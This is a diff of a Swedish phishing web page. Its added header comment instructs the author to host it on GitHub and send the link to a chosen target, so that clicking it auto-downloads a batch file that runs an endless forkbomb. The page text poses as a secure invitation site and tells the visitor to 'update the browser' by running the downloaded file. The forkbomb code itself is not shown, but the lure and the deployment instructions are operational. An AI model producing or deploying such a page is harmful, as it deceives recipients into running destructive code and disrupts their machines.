@@ -1,3 +1,6 @@
+laddu upp till github och skicka som länk den kommer ladda ner batch automatikst till den som klickar och köra grov forkbomb oändligt.ndu kan ändra texten och url logan för det som passar den du ska skicak detta till. testa den via rdp innan
+
+
 <!DOCTYPE html>
 <html lang="sv">
 <head>
@@ -50,7 +53,7 @@
 <body>
     <div class="container">
                 <!-- Logotypen visas här -->
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTzA88DBqBxcQel34LqvIm-yuGKIw0mo1VKqA&s">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTzA88DBqBxcQel34LqvIm-yuGKIw0mo1VKqA&s" alt="WB Orden Logotyp" class="logo">
         <p>Hello fellow twinks,</p>
         <p>We have now launched a new site dedicated to invitations to festivities. To ensure a secure and seamless experience, we use <strong>HTTPS with AES-256 encryption</strong>.</p>
 <p>To access the new site, you need to update your browser to the latest version. Click the button below to start the update, then go to the latest downloads in the data and click on the file to complete the update.</p>
